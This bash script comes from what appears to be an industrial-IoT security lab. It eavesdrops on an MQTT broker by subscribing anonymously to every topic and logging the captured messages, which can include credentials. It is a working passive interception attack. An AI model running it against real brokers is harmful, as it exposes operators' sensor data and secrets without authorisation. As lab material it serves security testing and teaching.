#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
# 01_eavesdrop.sh - MQTT Eavesdropping Attack
#
# Scenario 1: Passive interception of all MQTT traffic.
#
# Attack description:
#   The attacker connects anonymously to the broker and subscribes to all
#   topics using the wildcard '#'. Since no authentication or TLS is enforced,
#   all sensor data — including hardcoded credentials exposed in payloads —
#   is intercepted in cleartext.
#
# MITRE ATT&CK for ICS:
#   - T0802: Automated Collection
#   - T0861: Point & Tag Identification
# ──────────────────────────────────────────────────────────────────────────────

BROKER="${BROKER_HOST:-172.20.0.20}"
PORT="${BROKER_PORT:-1883}"
DURATION="${ATTACK_DURATION:-60}"
OUTPUT_DIR="/attacker/results"
OUTPUT_FILE="$OUTPUT_DIR/01_eavesdrop_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$OUTPUT_DIR"

echo "=============================================="
echo " SCENARIO 1 - MQTT Eavesdropping Attack"
echo "=============================================="
echo " Target broker : $BROKER:$PORT"
echo " Duration      : ${DURATION}s"
echo " Output        : $OUTPUT_FILE"
echo "=============================================="
echo ""
echo "[*] Starting eavesdropping on broker $BROKER:$PORT..."
echo "[*] Subscribing to wildcard topic '#' — intercepting ALL messages"
echo "[*] Press CTRL+C to stop early"
echo ""

# Run mosquitto_sub with timeout, output to both terminal and file
timeout "$DURATION" mosquitto_sub \
    -h "$BROKER" \
    -p "$PORT" \
    -t "#" \
    -v 2>/dev/null | tee "$OUTPUT_FILE"

MSG_COUNT=$(wc -l < "$OUTPUT_FILE" 2>/dev/null || echo 0)

echo ""
echo "=============================================="
echo " ATTACK SUMMARY - Scenario 1"
echo "=============================================="
echo " Duration          : ${DURATION}s"
echo " Messages captured : $MSG_COUNT"
echo " Output saved to   : $OUTPUT_FILE"
echo "=============================================="
